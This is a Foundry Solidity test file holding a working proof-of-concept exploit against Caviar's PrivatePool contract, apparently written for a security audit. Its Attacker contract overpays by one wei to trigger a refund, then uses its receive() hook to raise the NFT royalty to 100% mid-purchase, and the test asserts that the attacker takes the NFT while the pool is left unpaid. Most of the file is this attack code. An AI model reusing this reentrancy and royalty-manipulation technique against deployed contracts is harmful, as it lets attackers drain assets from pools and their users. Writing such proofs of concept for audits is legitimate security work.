// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";

// ----------------------------------------------------------
//                    Minimal Helper Contracts
// ----------------------------------------------------------

/* Minimal factory that satisfies the interface surface required by
 * the PrivatePool contract (protocolFeeRate & ownerOf).
 * No protocol fee is charged (rate = 0) to simplify maths.
 */
contract DummyFactory {
    uint16 public constant protocolFeeRate = 0; // 0%

    // Only needed so that pool.ownerOf() modifier compiles (never used here)
    function ownerOf(uint256) external pure returns (address) {
        return address(0);
    }

    // Receive ETH from the pool
    receive() external payable { }
}

/* Minimal royalty registry that always returns the NFT itself as the
 * royalty lookup address – exactly what Caviar expects for many NFTs.
 */
contract DummyRoyaltyRegistry is IRoyaltyRegistry {
    function getRoyaltyLookupAddress(address nft) external pure returns (address) {
        return nft;
    }
}

/* ERC-721 that supports ERC-2981 with a public royalty setter so the
 * attacker can mutate royalty data during the exploit.
 */
import {ERC721} from "openzeppelin/token/ERC721/ERC721.sol";
import {ERC2981} from "openzeppelin/token/common/ERC2981.sol";

contract RoyaltyNFT is ERC721, ERC2981 {
    constructor() ERC721("RoyaltyNFT", "RNFT") { }

    function mint(address to, uint256 id) external {
        _safeMint(to, id);
        // start with 0% royalty so first _getRoyalty() returns 0
        _setTokenRoyalty(id, address(this), 0);
    }

    // Open function – callable by anybody (attacker) to mutate royalty info
    function setRoyalty(uint256 id, address receiver, uint96 feeNumerator) external {
        _setTokenRoyalty(id, receiver, feeNumerator);
    }

    // Multiple inheritance interface support
    function supportsInterface(bytes4 interfaceId)
        public
        view
        override(ERC721, ERC2981)
        returns (bool)
    {
        return super.supportsInterface(interfaceId);
    }

    receive() external payable { } // allow receiving ETH royalties
}

/* Attacking contract that:
 * 1. Calls PrivatePool.buy with an over-payment of 1 wei to trigger a refund.
 * 2. In its receive() hook (executed during that refund) it bumps the royalty
 *    for the purchased token from 0% to 100%.
 * 3. The pool later pays full royalties (100%) to this contract, giving the
 *    NFT away essentially for free.
 */
contract Attacker {
    PrivatePool public immutable pool;
    RoyaltyNFT  public immutable nft;
    uint256     public immutable tokenId;
    bool        private flipped; // ensure royalty is only updated once

    constructor(PrivatePool _pool, RoyaltyNFT _nft, uint256 _tokenId) {
        pool    = _pool;
        nft     = _nft;
        tokenId = _tokenId;
    }

    // Called by the test to execute the exploit
    function attack(uint256 netInputAmount) external payable {
        uint256[] memory ids      = new uint256[](1);
        uint256[] memory weights  = new uint256[](1);
        ids[0]     = tokenId;
        weights[0] = 0; // ignored when merkleRoot == 0

        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);

        // Send the required amount PLUS ONE WEI to guarantee a refund
        pool.buy{value: netInputAmount + 1 wei}(ids, weights, proof);
    }

    // This gets executed during the pool’s refund, *between* the two
    // _getRoyalty() calls inside buy(); we flip royalty from 0% to 100%.
    receive() external payable {
        if (!flipped) {
            flipped = true;
            nft.setRoyalty(tokenId, address(this), 10_000); // 100% royalty
        }
    }
}

// ----------------------------------------------------------
//                        Exploit Test
// ----------------------------------------------------------

contract ExploitTest is Test {
    PrivatePool           pool;
    DummyFactory          factory;
    DummyRoyaltyRegistry  registry;
    RoyaltyNFT            nft;
    Attacker              attacker;

    uint256 constant TOKEN_ID = 1;

    function setUp() public {
        // 1. Deploy helpers
        factory  = new DummyFactory();
        registry = new DummyRoyaltyRegistry();
        nft      = new RoyaltyNFT();

        // 2. Deploy pool (no stolen-NFT oracle)
        pool = new PrivatePool(
            address(factory),
            address(registry),
            address(0)
        );

        // 3. Initialise pool
        pool.initialize(
            address(0),      // base token = ETH
            address(nft),    // NFT address
            10 ether,        // virtual base reserves
            10 ether,        // virtual NFT reserves (10 * 1e18)
            0,               // changeFee
            0,               // trading fee rate
            bytes32(0),      // merkleRoot (weights disabled)
            false,           // useStolenNftOracle
            true             // payRoyalties (must be true for exploit)
        );

        // 4. Mint NFT directly to the pool so it has inventory
        nft.mint(address(pool), TOKEN_ID);

        // 5. Fund attacker with some ETH for tx gas
        vm.deal(address(this), 100 ether);              // test contract funds
        attacker = new Attacker(pool, nft, TOKEN_ID);
        vm.deal(address(attacker), 5 ether);            // attacker funds
    }

    function testRoyaltyManipulationDrainsNFT() public {
        // ------------------- pre-state -------------------
        uint256 poolEthBefore     = address(pool).balance;
        uint256 attackerEthBefore = address(attacker).balance;
        assertEq(nft.ownerOf(TOKEN_ID), address(pool), "pool should own NFT before buy");

        // Retrieve required payment (with 0% royalty)
        (uint256 netInput,,) = pool.buyQuote(1e18); // buying one NFT (weight 1e18)

        // Prank from attacker EOA
        vm.startPrank(address(attacker));
        attacker.attack{value: netInput + 1 wei}(netInput);
        vm.stopPrank();

        // ------------------- post-state -------------------
        // 1. Attacker now owns the NFT
        assertEq(nft.ownerOf(TOKEN_ID), address(attacker), "attacker should own NFT after exploit");

        // 2. Attacker’s ETH balance virtually unchanged (only ~gas & 1 wei)
        assertGe(
            address(attacker).balance,
            attackerEthBefore - 2 wei,
            "attacker paid more than negligible amount"
        );

        // 3. Pool lost the NFT while its ETH balance did NOT increase
        assertEq(address(pool).balance, poolEthBefore, "pool received no ETH for losing NFT");
    }
}